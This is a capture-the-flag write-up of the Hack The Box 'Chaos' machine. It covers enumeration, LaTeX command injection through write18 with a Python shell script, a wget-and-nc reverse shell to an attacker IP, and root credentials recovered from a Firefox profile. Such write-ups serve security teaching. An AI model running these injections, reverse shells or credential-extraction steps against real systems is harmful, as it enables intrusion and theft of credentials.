---
layout: single
title: Chaos - Hack The Box
excerpt: "Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There's some simple crypto we have to do to decrypt an attachment and find a hidden link on the site. We then exploit the PDF creation website which uses LaTeX and gain RCE. After getting a reverse shell, we do some digging into the user's folders and find the webmin root credentials stored in the Firefox user profile."
date: 2019-05-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-chaos/chaos_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - wordpress
  - weak credentials
  - pdf 
  - LaTeX
  - firefox
  - saved credentials
---

![](/assets/images/htb-writeup-chaos/chaos_logo.png)

Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There's some simple crypto we have to do to decrypt an attachment and find a hidden link on the site. We then exploit the PDF creation website which uses LaTeX and gain RCE. After getting a reverses shell, we do some digging into the user's folders and find the webmin root credentials stored in the Firefox user profile.

## Summary

- There's a hidden wordpress blog with a password protected post
- By enumerating the users with wpscan, we find a single user `human` which is also the password for the protected post
- The post contains the credentials for a webmail account on webmail.chaos.htb site
- The user mailbox has a message directing us to another hidden URI on the site which contains a PDF maker application
- The application uses LaTeX and we can do command injection to get a reverse shell
- From `www-data` we can `su` to user `ayush` with the credentials we got from the wordpress post
- Searching the `ayush` home directory, we find a `.mozilla` directory which has saved `root` credentials for the Webmin application

## Blog / Tools used

- [wpscan](https://wpscan.org/)
- [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
- [https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)

### Nmap

Services running:
- HTTP server
- IMAP & POP3
- Webmin (not vulnerable to any CVE as far as I could see)

```
# nmap -sC -sV -p- 10.10.10.120
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 17:38 EST
Nmap scan report for 10.10.10.120
Host is up (0.029s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL AUTH-RESP-CODE STLS TOP PIPELINING RESP-CODES CAPA UIDL
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login more SASL-IR capabilities LITERAL+ STARTTLS have LOGIN-REFERRALS post-login listed OK ENABLE LOGINDISABLEDA0001 ID IDLE IMAP4rev1
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login SASL-IR capabilities LITERAL+ AUTH=PLAINA0001 more LOGIN-REFERRALS have post-login listed ENABLE OK ID IDLE IMAP4rev1
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER TOP PIPELINING RESP-CODES CAPA UIDL
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration of the different pages

There's a couple of different web pages:

1. If an FQDN is not used, we get a page with `Direct IP not allowed` error message:

![](/assets/images/htb-writeup-chaos/directip.png)

2. The main **chaos.htb** page is just a generic corporate webpage with nothing else interesting on it:

![](/assets/images/htb-writeup-chaos/webpage.png)

3. The page on port 10000 contains a link to HTTPS for the Webmin app

![](/assets/images/htb-writeup-chaos/port10000.png)

![](/assets/images/htb-writeup-chaos/webmin.png)

Observations:
- Nothing interesting on the main page (just a static page)
- We can't log in to the Webmin application (tried guessing credentials, checking CVEs)

### Dirbusting the website

Next, let's dirbust the site to find hidden files & folders:

Checking **10.10.10.120**
```
# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -s 200,204,301,302 -u http://10.10.10.120
/javascript (Status: 301)
/wp (Status: 301)
```

Checking **chaos.htb**
```
# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -s 200,204,301,302 -u http://chaos.htb
/css (Status: 301)
/img (Status: 301)
/javascript (Status: 301)
/js (Status: 301)
/source (Status: 301)
```

Let's check out that Wordpress site.

### Wordpress

The site has a single post protected by a password:

![](/assets/images/htb-writeup-chaos/wordpress.png)

Next, let's use wpscan to check for any WP vulnerabilities. There doesn't seem to be any obvious non-authenticated vulnerability based on wpscan's output, but we find a single user:

```
# wpscan -u http://10.10.10.120/wp/wordpress
...
[!] Detected 1 user from RSS feed:
+-------+
| Name  |
+-------+
| human |
+-------+
```

If we try `human` as the password for the protected post we get:

![](/assets/images/htb-writeup-chaos/credentials.png)

So we got the following credentials:
- user: `ayush`
- pass: `jiujitsu`

### Access to webmail

The note we found refers to **webmail**, so if we modify our local host file and add `webmail.chaos.htb` we get to the following page:

![](/assets/images/htb-writeup-chaos/webmail.png)

There's a message in the Drafts folder containing an encrypted message:

![](/assets/images/htb-writeup-chaos/email.png)

We're provided with the source code of the encryption app, which is basically just using AES in CBC mode and using the `sahay` name as the password (as the email says). The filesize and IV are stored at the beginning of the output file. We have all the pieces to decrypt the file, we just need to write a quick script to do that.

```python
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def getKey(password):
    hasher = SHA256.new(password)
    return hasher.digest()

with open('enim_msg.txt') as f:
    c = f.read()

filesize = int(c[:16])
print("filesize: %d" % filesize)
iv = c[16:32]
print("IV: %s" % iv)
key = getKey("sahay")
cipher = AES.new(key, AES.MODE_CBC, iv )
print cipher.decrypt(c[32:])
```

The decrypted message is:

```
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

### PDF maker app

The hidden directory contains a web application that generates PDF files.

![](/assets/images/htb-writeup-chaos/pdfmaker.png)

The page uses javascript to do an Ajax call to the backend `ajax.php` file:

```javascript
function senddata() {
	var content = $("#content").val();
	var template = $("#template").val();

	if(content == "") {
		$("#output").text("No input given!");
	}
	$.ajax({
		url: "ajax.php",
		data: {
			'content':content,
			'template':template
		},
		method: 'post'
	}).success(function(data) {
		$("#output").text(data)
	}).fail(function(data) {
		$("#output").text("OOps, something went wrong...\n"+data)
	})
	return false;
}
```

![](/assets/images/htb-writeup-chaos/latex_post.png)

The results of the POST request looks like this:

![](/assets/images/htb-writeup-chaos/latex_output.png)

So the backend uses LaTeX to convert the data into a PDF. After doing some googling I found a [nice blog post](https://0day.work/hacking-with-latex/) about ways to execute arbitrary command using LaTeX.

There's a few commands that are blacklisted, like:
 - `\input{/etc/passwd}`
 - `\include{password}`

 ![](/assets/images/htb-writeup-chaos/blacklisted.png)

 However the `\immediate\write18{whoami}` command is allowed. The output contains extra stuff but we can see that the `whoami` command was executed:

 ![](/assets/images/htb-writeup-chaos/rce.png)

I wrote a quick python script that sends the commands using the method above and also cleans up the output with some regex:

```python
{% raw %}
import re
import requests

headers = {
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'X-Requested-With': 'XMLHttpRequest',
	'Cookie': 'redirect=1'
}

while (True):
	cmd = raw_input('> ')

	data = {
		'content': '\\immediate\\write18{%s}' % cmd,
		'template': 'test1'
	}

	r = requests.post('http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php', headers=headers, data=data)
	out = r.text
	m = re.search('.*\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd\)\n\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd\)(.*)\[1', out, re.MULTILINE|re.DOTALL)
	if m:
		print m.group(1)
{% endraw %}        
```

The output of the script looks like this:

```
# python crapshell.py 
> whoami
www-data
 
> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
> ls -l /home
total 8
drwx------ 6 ayush ayush 4096 Dec 16 03:32 ayush
drwx------ 5 sahay sahay 4096 Nov 24 23:53 sahay
```

We still want to get a proper shell so what I did was download `nc` to the box and then spawn a reverse shell:

```
> wget -O /tmp/nc 10.10.14.23/nc
 
> chmod +x /tmp/nc
 
> /tmp/nc -e /bin/bash 10.10.14.23 4444

[...]

# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.120] 52378
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
```

There's not much we can do with `www-data` except look at the web app source code and get the MySQL password for the Wordpress and Roundcube install. But we already have the `ayush` credentials so we can `su` to this user and get the `user.txt` flag:

```
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su -l ayush
Password: jiujitsu

ayush@chaos:~$ cat user.txt
Command 'cat' is available in '/bin/cat'
The command could not be located because '/bin' is not included in the PATH environment variable.
cat: command not found
ayush@chaos:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
<l/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ayush@chaos:~$ cat user.txt
eef391...
```

### Privesc through Firefox credentials

Remember that webmin page? By default, the `root` user credentials are used to log in to the application. When we look at `ayush` home directory, we see there's a `.mozilla` folder in there with some encrypted Firefox credentials in `logins.json`:

```
ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ cat logins.json
cat logins.json
{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":"https://chaos.htb:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb","guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
```

The `formSubmitURL` value is `https://chaos.htb:10000` so this means the user logged on to the Webmin application and saved the credentials.

To decrypt those, we'll first tar the whole .mozilla directory and `nc` it to our Kali box, then use [firefox_decrypt](https://github.com/unode/firefox_decrypt). The password is the same as the ayush password: `jiujitsu`

```
# ./firefox_decrypt.py /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/
2018-12-15 21:02:22,369 - WARNING - profile.ini not found in /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/
2018-12-15 21:02:22,370 - WARNING - Continuing and assuming '/root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/' is a profile location

Master Password for profile /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/: 

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
```

Nice, we can just `su` to root and get the last flag:

```
ayush@chaos:~$ su -l root
su -l root
Password: Thiv8wrej~

root@chaos:~# cat /root/root.txt
cat /root/root.txt
4eca7e...
```